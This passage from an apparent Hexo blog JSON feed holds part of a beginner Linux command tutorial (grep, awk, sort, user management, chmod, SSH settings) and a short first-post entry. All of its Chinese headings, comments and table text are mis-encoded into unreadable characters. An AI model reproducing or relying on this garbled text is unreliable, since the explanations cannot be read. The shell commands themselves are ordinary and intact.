å¼€å§‹å‘½ä»¤</li>\n</ul>\n<p>å¸¸ç”¨å‘½ä»¤:</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\"><span class=\"hljs-symbol\">:wq</span>   <span class=\"hljs-comment\"># ä¿å­˜é€€å‡º</span><br><span class=\"hljs-symbol\">:q</span>    <span class=\"hljs-comment\"># é€€å‡º</span><br><span class=\"hljs-symbol\">:q!</span>   <span class=\"hljs-comment\"># å¼ºåˆ¶é€€å‡ºä¸ä¿å­˜</span><br>dd    <span class=\"hljs-comment\"># åˆ é™¤æ•´è¡Œ</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"11-æŸ¥çœ‹æ–‡ä»¶å†…å®¹\"><a href=\"#11-æŸ¥çœ‹æ–‡ä»¶å†…å®¹\" class=\"headerlink\" title=\"11. æŸ¥çœ‹æ–‡ä»¶å†…å®¹\"></a>11. æŸ¥çœ‹æ–‡ä»¶å†…å®¹</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> test03.txt            <span class=\"hljs-comment\"># ä»å¤´åˆ°å°¾æŸ¥çœ‹</span><br><span class=\"hljs-built_in\">tac</span> test03.txt            <span class=\"hljs-comment\"># å€’åºæŸ¥çœ‹</span><br><span class=\"hljs-built_in\">head</span> test03.txt           <span class=\"hljs-comment\"># æŸ¥çœ‹å‰10è¡Œ</span><br><span class=\"hljs-built_in\">head</span> -5 test03.txt        <span class=\"hljs-comment\"># æŸ¥çœ‹å‰5è¡Œ</span><br><span class=\"hljs-built_in\">tail</span> test03.txt           <span class=\"hljs-comment\"># æŸ¥çœ‹å10è¡Œ</span><br><span class=\"hljs-built_in\">tail</span> -n 5 test03.txt      <span class=\"hljs-comment\"># æŸ¥çœ‹å5è¡Œ</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"å››ã€ç®¡é“ä¸è¿‡æ»¤æ“ä½œ\"><a href=\"#å››ã€ç®¡é“ä¸è¿‡æ»¤æ“ä½œ\" class=\"headerlink\" title=\"å››ã€ç®¡é“ä¸è¿‡æ»¤æ“ä½œ\"></a>å››ã€ç®¡é“ä¸è¿‡æ»¤æ“ä½œ</h2><h3 id=\"12-ç®¡é“ç¬¦ï¼ˆ-ï¼‰\"><a href=\"#12-ç®¡é“ç¬¦ï¼ˆ-ï¼‰\" class=\"headerlink\" title=\"12. ç®¡é“ç¬¦ï¼ˆ|ï¼‰\"></a>12. ç®¡é“ç¬¦ï¼ˆ|ï¼‰</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ip</span> addr | tail -<span class=\"hljs-number\">4</span>                         # æŸ¥çœ‹å‘½ä»¤è¾“å‡ºæœ€å<span class=\"hljs-number\">4</span>è¡Œ<br><span class=\"hljs-attribute\">ip</span> addr | tail -<span class=\"hljs-number\">4</span> | head -<span class=\"hljs-number\">1</span>              # æˆªå–ä¸­é—´æŸä¸€è¡Œ<br><span class=\"hljs-attribute\">ip</span> addr | tail -<span class=\"hljs-number\">4</span> | head -<span class=\"hljs-number\">1</span> | cut -c <span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">19</span>  # å–å‡ºå­—ç¬¦çš„ç¬¬<span class=\"hljs-number\">10</span>~<span class=\"hljs-number\">19</span>åˆ—ï¼ˆä¸å¸¸ç”¨ï¼‰<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"13-ç»Ÿè®¡å‘½ä»¤-wc\"><a href=\"#13-ç»Ÿè®¡å‘½ä»¤-wc\" class=\"headerlink\" title=\"13. ç»Ÿè®¡å‘½ä»¤ wc\"></a>13. ç»Ÿè®¡å‘½ä»¤ wc</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> aaa.txt | <span class=\"hljs-built_in\">wc</span> -l     <span class=\"hljs-comment\"># ç»Ÿè®¡è¡Œæ•°</span><br><span class=\"hljs-built_in\">cat</span> -n aaa.txt          <span class=\"hljs-comment\"># æ˜¾ç¤ºå†…å®¹ + è¡Œå·</span><br><span class=\"hljs-built_in\">wc</span> -c aaa.txt           <span class=\"hljs-comment\"># ç»Ÿè®¡å­—ç¬¦æ•°</span><br>ip addr | <span class=\"hljs-built_in\">wc</span> -l         <span class=\"hljs-comment\"># ç»Ÿè®¡è¡Œæ•°</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"14-ç”Ÿæˆæ•°å­—åºåˆ—-seq\"><a href=\"#14-ç”Ÿæˆæ•°å­—åºåˆ—-seq\" class=\"headerlink\" title=\"14. ç”Ÿæˆæ•°å­—åºåˆ— seq\"></a>14. ç”Ÿæˆæ•°å­—åºåˆ— seq</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">seq</span> <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">12</span>                  # è¾“å‡º <span class=\"hljs-number\">5</span> åˆ° <span class=\"hljs-number\">12</span><br><span class=\"hljs-attribute\">seq</span> -w <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">12</span>               # ç­‰å®½æ ¼å¼è¾“å‡º<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"15-è¡Œè¿‡æ»¤-grep\"><a href=\"#15-è¡Œè¿‡æ»¤-grep\" class=\"headerlink\" title=\"15. è¡Œè¿‡æ»¤ grep\"></a>15. è¡Œè¿‡æ»¤ grep</h3><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs perl\"><span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">&#x27;333&#x27;</span> aaa.txt             <span class=\"hljs-comment\"># æ¨¡ç³ŠåŒ¹é…è¡Œä¸­å«æœ‰ 333</span><br><span class=\"hljs-keyword\">grep</span> -n <span class=\"hljs-string\">&#x27;333&#x27;</span> aaa.txt          <span class=\"hljs-comment\"># æ˜¾ç¤ºè¡Œå·</span><br>ip addr | <span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">&#x27;inet&#x27;</span>          <span class=\"hljs-comment\"># è¿‡æ»¤å‡ºåŒ…å« inet çš„è¡Œ</span><br><span class=\"hljs-keyword\">grep</span> -w <span class=\"hljs-string\">&#x27;å…³é”®å­—&#x27;</span> æ–‡ä»¶             <span class=\"hljs-comment\"># ç²¾å‡†åŒ¹é…æ•´è¯</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"16-æŒ‰åˆ—å–å€¼-awk\"><a href=\"#16-æŒ‰åˆ—å–å€¼-awk\" class=\"headerlink\" title=\"16. æŒ‰åˆ—å–å€¼ awk\"></a>16. æŒ‰åˆ—å–å€¼ awk</h3><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">awk</span> <span class=\"hljs-string\">&#x27;&#123;print <span class=\"hljs-variable\">$1</span>&#125;&#x27;</span> aaa.txt         <span class=\"hljs-comment\"># è¾“å‡ºç¬¬ä¸€åˆ—</span><br>awk <span class=\"hljs-string\">&#x27;&#123;print <span class=\"hljs-variable\">$2</span>&#125;&#x27;</span> aaa.txt         <span class=\"hljs-comment\"># è¾“å‡ºç¬¬äºŒåˆ—</span><br>awk -F <span class=\"hljs-string\">&#x27;,&#x27;</span> <span class=\"hljs-string\">&#x27;&#123;print <span class=\"hljs-variable\">$1</span>&#125;&#x27;</span> aaa.txt  <span class=\"hljs-comment\"># ä»¥é€—å·ä¸ºåˆ†éš”ç¬¦å–ç¬¬ä¸€åˆ—</span><br>awk -F <span class=\"hljs-string\">&#x27;,&#x27;</span> <span class=\"hljs-string\">&#x27;&#123;print <span class=\"hljs-variable\">$NF</span>&#125;&#x27;</span> aaa.txt <span class=\"hljs-comment\"># å–æœ€åä¸€åˆ—</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"17-æ’åº-sort\"><a href=\"#17-æ’åº-sort\" class=\"headerlink\" title=\"17. æ’åº sort\"></a>17. æ’åº sort</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> test02.txt | <span class=\"hljs-built_in\">sort</span> -n        <span class=\"hljs-comment\"># æŒ‰æ•°å­—å‡åºæ’åº</span><br><span class=\"hljs-built_in\">cat</span> test02.txt | <span class=\"hljs-built_in\">sort</span> -n -r     <span class=\"hljs-comment\"># æ•°å­—é™åºæ’åº</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"18-å»é‡-uniq\"><a href=\"#18-å»é‡-uniq\" class=\"headerlink\" title=\"18. å»é‡ uniq\"></a>18. å»é‡ uniq</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> test02.txt | <span class=\"hljs-built_in\">sort</span> -n | <span class=\"hljs-built_in\">uniq</span>         <span class=\"hljs-comment\"># å»é‡</span><br><span class=\"hljs-built_in\">cat</span> test02.txt | <span class=\"hljs-built_in\">sort</span> -n | <span class=\"hljs-built_in\">uniq</span> -c      <span class=\"hljs-comment\"># å»é‡å¹¶ç»Ÿè®¡æ¯é¡¹å‡ºç°æ¬¡æ•°</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"äº”ã€Linux-ç›®å½•ç»“æ„åŸºç¡€ä¸è·¯å¾„ç†è§£\"><a href=\"#äº”ã€Linux-ç›®å½•ç»“æ„åŸºç¡€ä¸è·¯å¾„ç†è§£\" class=\"headerlink\" title=\"äº”ã€Linux ç›®å½•ç»“æ„åŸºç¡€ä¸è·¯å¾„ç†è§£\"></a>äº”ã€Linux ç›®å½•ç»“æ„åŸºç¡€ä¸è·¯å¾„ç†è§£</h2><h3 id=\"ğŸ“Œ-Linux-çš„ä¸€åˆ‡çš†æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯å¸¸è§ç›®å½•è¯´æ˜ï¼Œé‡è¦ç›®å½•åˆ‡å‹¿éšæ„åˆ é™¤ï¼\"><a href=\"#ğŸ“Œ-Linux-çš„ä¸€åˆ‡çš†æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯å¸¸è§ç›®å½•è¯´æ˜ï¼Œé‡è¦ç›®å½•åˆ‡å‹¿éšæ„åˆ é™¤ï¼\" class=\"headerlink\" title=\"ğŸ“Œ Linux çš„ä¸€åˆ‡çš†æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯å¸¸è§ç›®å½•è¯´æ˜ï¼Œé‡è¦ç›®å½•åˆ‡å‹¿éšæ„åˆ é™¤ï¼\"></a>ğŸ“Œ Linux çš„ä¸€åˆ‡çš†æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯å¸¸è§ç›®å½•è¯´æ˜ï¼Œé‡è¦ç›®å½•åˆ‡å‹¿éšæ„åˆ é™¤ï¼</h3><table>\n<thead>\n<tr>\n<th>ç›®å½•</th>\n<th>åŠŸèƒ½è¯´æ˜</th>\n<th>æ˜¯å¦å¯åˆ é™¤</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&#x2F;bin</td>\n<td>å­˜æ”¾åŸºæœ¬äºŒè¿›åˆ¶å‘½ä»¤ï¼ˆå¦‚ ls, cp, mv ç­‰ï¼‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;sbin</td>\n<td>ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„å‘½ä»¤ï¼ˆå¦‚ reboot, shutdown ç­‰ï¼‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;boot</td>\n<td>å¯åŠ¨å¼•å¯¼ç›¸å…³æ–‡ä»¶ï¼ˆå¦‚å†…æ ¸ï¼‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;dev</td>\n<td>è®¾å¤‡æ–‡ä»¶ç›®å½•ï¼Œå¦‚ç¡¬ç›˜ã€Uç›˜ã€ç»ˆç«¯ç­‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;etc</td>\n<td>ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•ï¼Œç›¸å½“äº Windows çš„æ³¨å†Œè¡¨</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;home</td>\n<td>æ‰€æœ‰æ™®é€šç”¨æˆ·çš„å®¶ç›®å½•æ‰€åœ¨ä½ç½®</td>\n<td>âœ…å¯ç®¡ç†ï¼ˆæ…åˆ ï¼‰</td>\n</tr>\n<tr>\n<td>&#x2F;root</td>\n<td>root ç®¡ç†å‘˜ç”¨æˆ·çš„ä¸“å±å®¶ç›®å½•</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;lib</td>\n<td>32 ä½ç³»ç»Ÿåº“æ–‡ä»¶ï¼ˆ.soåŠ¨æ€é“¾æ¥åº“ï¼‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;lib64</td>\n<td>64 ä½ç³»ç»Ÿåº“æ–‡ä»¶</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;media</td>\n<td>ç³»ç»ŸæŒ‚è½½å¯ç§»åŠ¨ä»‹è´¨ï¼ˆUç›˜ã€å…‰ç›˜ï¼‰æ—¶çš„é»˜è®¤ç›®å½•</td>\n<td>âš ï¸å¯åˆ é™¤ï¼ˆroot æƒé™ï¼‰</td>\n</tr>\n<tr>\n<td>&#x2F;mnt</td>\n<td>æ‰‹åŠ¨æŒ‚è½½ç›®å½•ï¼ˆå¦‚ NFS&#x2F;Uç›˜ï¼‰</td>\n<td>âš ï¸å¯åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;opt</td>\n<td>ç¬¬ä¸‰æ–¹è½¯ä»¶é»˜è®¤å®‰è£…è·¯å¾„ä¹‹ä¸€</td>\n<td>âš ï¸å¯åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;proc</td>\n<td>è™šæ‹Ÿè¿›ç¨‹ç›®å½•ï¼Œæ¯ä¸ªè¿è¡Œä¸­çš„è¿›ç¨‹ä¸€ä¸ªç›®å½•</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;srv</td>\n<td>é€šå¸¸ç”¨äºæ”¾ç½®æœåŠ¡ç›¸å…³çš„æºä»£ç æˆ–æ•°æ®</td>\n<td>âš ï¸å¯åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;sys</td>\n<td>æä¾›å†…æ ¸ä¸ç¡¬ä»¶äº¤äº’çš„æ¥å£</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;tmp</td>\n<td>ä¸´æ—¶æ–‡ä»¶ç›®å½•ï¼Œç³»ç»Ÿé‡å¯æˆ–å®šæœŸè‡ªåŠ¨æ¸…é™¤</td>\n<td>âš ï¸å¯æ¸…ç©º</td>\n</tr>\n<tr>\n<td>&#x2F;run</td>\n<td>å­˜æ”¾è¿è¡Œæ—¶çŠ¶æ€æ–‡ä»¶ï¼Œå¦‚ PID æ–‡ä»¶ã€é”æ–‡ä»¶ç­‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;usr</td>\n<td>ç”¨æˆ·çº§ç¨‹åºã€åº“ã€èµ„æºæ–‡ä»¶ç›®å½•ï¼ˆå¦‚ &#x2F;usr&#x2F;binï¼‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n<tr>\n<td>&#x2F;var</td>\n<td>ç»å¸¸å˜åŠ¨çš„æ•°æ®ç›®å½•ï¼Œå¦‚æ—¥å¿— &#x2F;var&#x2F;logã€ç¼“å­˜ç­‰</td>\n<td>âŒä¸èƒ½åˆ é™¤</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"å…­ã€ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†\"><a href=\"#å…­ã€ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†\" class=\"headerlink\" title=\"å…­ã€ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†\"></a>å…­ã€ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†</h2><h3 id=\"ğŸ‘¤-1-ç”¨æˆ·ç®¡ç†\"><a href=\"#ğŸ‘¤-1-ç”¨æˆ·ç®¡ç†\" class=\"headerlink\" title=\"ğŸ‘¤ 1. ç”¨æˆ·ç®¡ç†\"></a>ğŸ‘¤ 1. ç”¨æˆ·ç®¡ç†</h3><h4 id=\"åˆ›å»ºç”¨æˆ·\"><a href=\"#åˆ›å»ºç”¨æˆ·\" class=\"headerlink\" title=\"åˆ›å»ºç”¨æˆ·\"></a>åˆ›å»ºç”¨æˆ·</h4><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">useradd</span> test1          <span class=\"hljs-comment\"># åˆ›å»º test1 ç”¨æˆ·</span><br>passwd test1           <span class=\"hljs-comment\"># ä¸º test1 è®¾ç½®å¯†ç ï¼ˆroot æ“ä½œï¼‰</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯\"><a href=\"#æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯\" class=\"headerlink\" title=\"æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯\"></a>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h4><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-built_in\">id</span> test1<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"åˆ é™¤ç”¨æˆ·\"><a href=\"#åˆ é™¤ç”¨æˆ·\" class=\"headerlink\" title=\"åˆ é™¤ç”¨æˆ·\"></a>åˆ é™¤ç”¨æˆ·</h4><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">userdel</span> test1              <span class=\"hljs-comment\"># åˆ é™¤ç”¨æˆ·ï¼ˆéœ€å…ˆé€€å‡ºç™»å½•ï¼‰</span><br>userdel -r test1           <span class=\"hljs-comment\"># åˆ é™¤ç”¨æˆ·å¹¶æ¸…ç†å®¶ç›®å½•ç­‰ç›¸å…³å†…å®¹</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"ä¿®æ”¹ç”¨æˆ·å±æ€§\"><a href=\"#ä¿®æ”¹ç”¨æˆ·å±æ€§\" class=\"headerlink\" title=\"ä¿®æ”¹ç”¨æˆ·å±æ€§\"></a>ä¿®æ”¹ç”¨æˆ·å±æ€§</h4><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">usermod</span> -L test1           <span class=\"hljs-comment\"># é”å®šç”¨æˆ·ï¼Œç¦æ­¢ç™»å½•</span><br>usermod -U test1           <span class=\"hljs-comment\"># è§£é”ç”¨æˆ·</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯-1\"><a href=\"#æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯-1\" class=\"headerlink\" title=\"æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯\"></a>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h4><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">chage</span> -l test1             <span class=\"hljs-comment\"># æŸ¥çœ‹ç”¨æˆ·å¯†ç å’Œè¿‡æœŸç­–ç•¥</span><br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ä¸ƒã€æƒé™ç®¡ç†\"><a href=\"#ä¸ƒã€æƒé™ç®¡ç†\" class=\"headerlink\" title=\"ä¸ƒã€æƒé™ç®¡ç†\"></a>ä¸ƒã€æƒé™ç®¡ç†</h2><h3 id=\"1-æƒé™ä»‹ç»å’Œç¤ºä¾‹\"><a href=\"#1-æƒé™ä»‹ç»å’Œç¤ºä¾‹\" class=\"headerlink\" title=\"1. æƒé™ä»‹ç»å’Œç¤ºä¾‹\"></a>1. æƒé™ä»‹ç»å’Œç¤ºä¾‹</h3><p>æ–‡ä»¶æƒé™ç»„æˆï¼š</p>\n<figure class=\"highlight tap\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs tap\">-rw-r--r--.<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 0 </span>7æœˆ<span class=\"hljs-number\"> 20 </span>23:17 /tmp/123.txt<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-æƒé™æ“ä½œç¤ºä¾‹\"><a href=\"#2-æƒé™æ“ä½œç¤ºä¾‹\" class=\"headerlink\" title=\"2. æƒé™æ“ä½œç¤ºä¾‹\"></a>2. æƒé™æ“ä½œç¤ºä¾‹</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">chmod</span> u+x test1.txt<br><span class=\"hljs-built_in\">chmod</span> 777 test1.txt<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ–‡ä»¶å±æ€§è¯¦è§£\"><a href=\"#3-æ–‡ä»¶å±æ€§è¯¦è§£\" class=\"headerlink\" title=\"3. æ–‡ä»¶å±æ€§è¯¦è§£\"></a>3. æ–‡ä»¶å±æ€§è¯¦è§£</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">ls</span> -l /tmp/123.txt<br><br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"å…«ã€Linux-Shell\"><a href=\"#å…«ã€Linux-Shell\" class=\"headerlink\" title=\"å…«ã€Linux Shell\"></a>å…«ã€Linux Shell</h2><h3 id=\"1-Shell-æ¦‚å¿µ\"><a href=\"#1-Shell-æ¦‚å¿µ\" class=\"headerlink\" title=\"1. Shell æ¦‚å¿µ\"></a>1. Shell æ¦‚å¿µ</h3><p>Shell æ˜¯ç”¨æˆ·ä¸å†…æ ¸çš„äº¤äº’ç•Œé¢ã€‚</p>\n<h3 id=\"2-ä¼˜åŒ–-SSH-ç™»å½•é€Ÿåº¦\"><a href=\"#2-ä¼˜åŒ–-SSH-ç™»å½•é€Ÿåº¦\" class=\"headerlink\" title=\"2. ä¼˜åŒ– SSH ç™»å½•é€Ÿåº¦\"></a>2. ä¼˜åŒ– SSH ç™»å½•é€Ÿåº¦</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cp</span> /etc/ssh/sshd_config /tmp/<br>vi /etc/ssh/sshd_config<br><span class=\"hljs-comment\"># æ·»åŠ ï¼š</span><br>GSSAPIAuthentication no<br>UseDNS no<br>systemctl restart sshd<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-Shell-æç¤ºç¬¦\"><a href=\"#3-Shell-æç¤ºç¬¦\" class=\"headerlink\" title=\"3. Shell æç¤ºç¬¦\"></a>3. Shell æç¤ºç¬¦</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">PS1</span>=<span class=\"hljs-string\">&#x27;[\\u@\\h \\w]\\$ &#x27;</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-å¸¸ç”¨å¿«æ·é”®\"><a href=\"#4-å¸¸ç”¨å¿«æ·é”®\" class=\"headerlink\" title=\"4. å¸¸ç”¨å¿«æ·é”®\"></a>4. å¸¸ç”¨å¿«æ·é”®</h3><ul>\n<li><code>Ctrl + A</code>ï¼šå…‰æ ‡ç§»è‡³è¡Œé¦–</li>\n<li><code>Ctrl + E</code>ï¼šå…‰æ ‡ç§»è‡³è¡Œå°¾</li>\n<li><code>Ctrl + C</code>ï¼šç»ˆæ­¢å‰å°è¿›ç¨‹</li>\n<li><code>Ctrl + Z</code>ï¼šæš‚åœå¹¶åå°è¿è¡Œ</li>\n</ul>\n<h3 id=\"5-å†å²å‘½ä»¤ï¼ˆhistoryï¼‰\"><a href=\"#5-å†å²å‘½ä»¤ï¼ˆhistoryï¼‰\" class=\"headerlink\" title=\"5. å†å²å‘½ä»¤ï¼ˆhistoryï¼‰\"></a>5. å†å²å‘½ä»¤ï¼ˆhistoryï¼‰</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">history</span>          <span class=\"hljs-comment\"># åˆ—å‡ºæœ€è¿‘ 1000 æ¡ï¼ˆå¯åœ¨ $HISTSIZE ä¿®æ”¹ï¼‰</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-å‘½ä»¤åˆ«åï¼ˆaliasï¼‰\"><a href=\"#6-å‘½ä»¤åˆ«åï¼ˆaliasï¼‰\" class=\"headerlink\" title=\"6. å‘½ä»¤åˆ«åï¼ˆaliasï¼‰\"></a>6. å‘½ä»¤åˆ«åï¼ˆaliasï¼‰</h3><figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jboss-cli\"><span class=\"hljs-keyword\">alias</span> ll=&#x27;<span class=\"hljs-keyword\">ls</span> -l <span class=\"hljs-params\">--color=auto</span>&#x27;<br><span class=\"hljs-keyword\">unalias</span> ll<br><br></code></pre></td></tr></table></figure>\n\n",
            "tags": [
                "linux",
                "å‘½ä»¤"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/20/hello-world/",
            "url": "https://bae-ace.github.io/2025/07/20/hello-world/",
            "title": "hello-world",
            "date_published": "2025-07-20T07:39:53.000Z",
            "content_html": "<p>ğŸ‰ æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢ï¼è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œç”¨æ¥æµ‹è¯• Hexo æ˜¯å¦æˆåŠŸéƒ¨ç½²å•¦ï½</p>\n<div class=\"note note-note-primary\">\n            <p>å¦‚æœä½ çœ‹åˆ°è¿™ç¯‡æ–‡ç« ï¼Œè¯´æ˜åšå®¢å·²ç»å¯åŠ¨æˆåŠŸå•¦ï¼</p>\n          </div>\n<p><img src=\"https://bae-ace.github.io/img/exanple.jpg\"></p>\n",
            "tags": [
                "hexo",
                "åšå®¢æ­å»º",
                "åˆå§‹æµ‹è¯•"
            ]
        }
    ]
}